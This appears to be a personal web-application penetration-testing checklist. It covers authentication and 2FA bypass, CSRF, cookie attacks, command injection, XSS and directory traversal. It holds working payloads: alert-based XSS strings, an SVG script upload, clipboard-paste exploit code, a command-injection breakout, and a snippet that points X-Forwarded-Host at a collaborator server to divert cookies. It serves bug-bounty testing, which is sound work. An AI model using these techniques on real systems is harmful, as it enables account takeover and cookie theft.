this is the testing process iam putting as everything cannot go into the human head..............

############################## Auth ########################################

-- using an abitary email to accept invitation...change the value of the email. [the accept endpoint or something changing the email]

-- check if there is temp password in reset password field.

-- changing email in oauth flow

-- bypassing 2fa by sending blank codes intercept request with incorrect code don't forwared remove code and forwared

-- always test for ratelimit if otp is involved

-- replacing the id in /recover with /reset-password

-- ATO via 2fa create a normal ussr without 2fa enabled create ussr2 with 2fa use id of normal ussr in 2fa request

-- bypassing captcha check with x-forwarded-for

-- try using users username to reset password i.e replace username with victim username 

-- redirect uri in oauth try adding abitary domain to the end ie example.daz.abitary.com try using openredirect

-- reset password so a token can be sent to the email change the email and see if token is still valid....

-- check reset password link protocol

-- ATO via registering new account for existing user by adding \u0023 and entering a new password 

-- direct page request.... for example the flow is login=>admin but going straight to /admin

-- parameter modification logged_in = True

-- response manipulation right click and select do intercept >> response to this request

-- check response tab if reset token is leaked there{dev tools}... 

-- it token is being reflected in the response test for cors misconfiguration to see if ATO is possible...

-- simple path navigation i.e api/users fuzz is recommended

-- csrf methods:
                remove csrf token
                change to random value
                change to unauthenticated user token
                change to another authenticated user token
                change http methods
                remove referer value
                remove referer header
                mixture of some of em

-- check session, local, cookie if role3s exists i.e admin

-- try sending two emails at the same time to the reset password if it will generate the same password

--  changing product id to zero <bussiness logic>

-- mass assignment adding parameter like email requires guessing

-- bypassing 2fa by going to the endpoint directly, if it doesn't work change ref feral as if you came from 2fa page

-- if you get token from 2fa try using if it will work, also try on different account if it will bypass 2fa

-- try reusing email verification link to see if you can access account without 2fa

-- Using the same session start the flow using your account and the victim's account. When reaching the 2FA point on both accounts, complete the 2FA with your account but do not access the next part. Instead of that, try to access the next step with the victim's account flow. If the back-end only set a boolean inside your sessions saying that you have successfully passed the 2FA you will be able to bypass the 2FA of the victim.

-- tip any functionality that logs user in automatically like reset password etc, try abusing it..... I.e if the reset me functionality is tied to ip, try x-forwarded-for: on victim ip. 

-- using previous sessions after activating 2fa

-- Create an Account and Turn On 2FA.
Logout from that account.
Now, Go to forget Password-Reset page.
Change your password.
Now try to log in.
If you are not asked to enter a 2FA code, You can report.

-- website that requires roles and adding users to group... see if you can replace your username and email with victim if it adds them automatically... 

-- parameter guessing adding password to JSON body in request and all sorts I.e email to bypass 2fa

-- if the webapp has an upload image functionality/ link to for image insertion, be sure that the malicious link hass the root domain,
   or a invitation code that when viewed it automatically add the victim as friend



###### command injection

// oh yeah the command injection...... 
a lot of programming spaces to cover let begin 

// get a parameter like name break out of the string with " or ' try various payload
;";commands

// command injection is not found in regular web app it is usually found in services that serve webapps 


###### Cookie Based Attack

// basic checks like is the cookie the same after login. 

// log out and try to use the same cookie. 

// check of cookie has any information and try to modify it

// Try to create several accounts with almost the same username and check if you can see similarities.

// check if previous cookie works after changing password. 

// 
################## XSS #######################3
.. the svg image upload style
the following svg payload....           

            <?xml version="1.0" standalone="no"?>
            <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
            <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
               <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
               <script type="text/javascript">
                  alert(document.domain);
               </script>
            </svg>

.. if the page contains a parameter i.e param=  , try breaking the application, insert an emoji,
if the application breaks insert a script tag afterwards i.e param='emoji'<script>alert()</script>

.. changing the x-forwarded-host to burp/zap oastify server it can confuse a load balancer to forward cookie
to the attacker controlled domain, if an xxs javascript could be used to steal cookies

      function httpGet(Url)
      {
       var xmlHttp = new XMLHttpRequest(); // Create a new XMLHttpRequest object
       xmlHttp.open( “GET”, Url, false ); // Initialize the request 
       **xmlHttp.setRequestHeader(“X-Forwarded-Host”, “https://collaborator-server.com"); // Set a custom HTTP header (X-Forwarded-Host) pointing to collaborator server**
       xmlHttp.send( null ); // Send the request
       return xmlHttp.responseText; 
      }
      httpGet(“https://vulnerableapp.host/"); // Run payload

.. copy and paste xss, the following snippet is vulnerable to xss
                                                                    <input placeholder="Paste here" id="pasted"/>
                                                                    <script>
                                                                    document.addEventListener('paste', event => {
                                                                        const data = event.clipboardData.getData('text/html');
                                                                        pasted.innerHTML = data;
                                                                    });
                                                                    </script>

it can be exploited with the following 

                                                              <button onclick="copy()">Click</button>
                                                              <script>
                                                                  document.addEventListener('copy', event => {
                                                                      event.preventDefault();
                                                                      event.clipboardData.setData('text/html', '<img src onerror=alert(1)>');
                                                                      alert('Please paste the copied contents into the vulnerable page');
                                                                  });
                                                                  function copy() {
                                                                      document.execCommand('copy');
                                                                  }
                                                              </script>

.. xss via file upload, if the functionality does not allow uploading of other files excetpt that from .images extensions
   try uploading without file just extension, i.e .mp3 and change the content to html with script tag, 
   upload a mask.jpg so you can navigate to the .mp3 path

.. test every parameters in a webapp for xss i.e param=1&param=1&param=3

.. if data from the parameter is reflecting on the body of the html i.e an img, iframe you can breakout using the ", and  prolly " onload=alert&#0000000040origin) value="

.. from parameter you can input an encoded version of <svg/onload=alert("XSS") >

.. if  encountred withform data disposition you can add Content-Disposition: form-data; name="some name"
1<ScRiPt>alert(9639)</ScRiPt>

.. any link found could be i.e redirect_to=javascript:alert("XSS"), returnTo=javascript:alert(document.cookie)

.. try adding '-confirm('XSSALERT')-' to url parameter note it has to be url encoded

.. you can try xss in the body of a json using mass manipulation or overwriting, i.e {
  "ipAddress": "<svg on onload=(alert)(document.domain)>",
  "callBackURL": "dssdsd"
}

.. you can intercept and modify a submission on a form if the form contains a json, \"javascript:alert()
.. javascript://%0aalert(1) for links


############### Directory Traversal #################33333
.. if you cant traverse any further try inserting a character i.e /../../a../../
